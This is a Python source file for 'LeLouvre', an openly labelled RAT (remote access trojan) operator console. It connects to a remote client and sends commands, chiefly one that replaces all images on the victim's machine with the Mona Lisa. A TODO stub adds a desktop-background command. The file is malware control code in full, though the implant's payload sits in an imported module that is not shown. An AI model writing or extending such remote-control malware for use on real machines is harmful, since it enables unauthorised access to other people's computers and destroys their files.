import client

class LeLouvre:
    def __init__(self):
        self.commands = {
            "0": "Exit from RAT interface",
            "1": "Replace all images with Mona Lisa"
        }
        self.client = client.Client()

    """ Establish a connection to remote RAT interface. """
    def connect_to_server(self):
        self.client.connect()
    
    def disconnect_from_server(self):
        self.client.close()

    """ Runs an interactive CLI RAT interface. """
    def run_rat_interface(self):
        self.connect_to_server()
        while True:
            print("\n#######################\nLe Louvre RAT Interface\n#######################\n")
            for command, description in self.commands.items():
                print(command, "->", description)
            
            command_key = input("\nEnter command: ")
            # Invalid input
            if command_key not in self.commands:
                print("Invalid command, please try again.")
                continue
            # Exit program
            elif command_key == "0":
                print("Exiting.")
                return
            else:
                self.execute_command(command_key)
        self.disconnect_from_server()

    """ Executes command based on the command key provided. """
    def execute_command(self, command_key):
        # Establish server for client connection
        if command_key == "1":
            resp = self.client.message("1")
            print(resp)
        # TODO: Set background to Mona Lisa
        elif command_key == "2":
            resp = self.client.message("2")
            print(resp)
            
if __name__=="__main__":
    le_louvre = LeLouvre()
    le_louvre.run_rat_interface()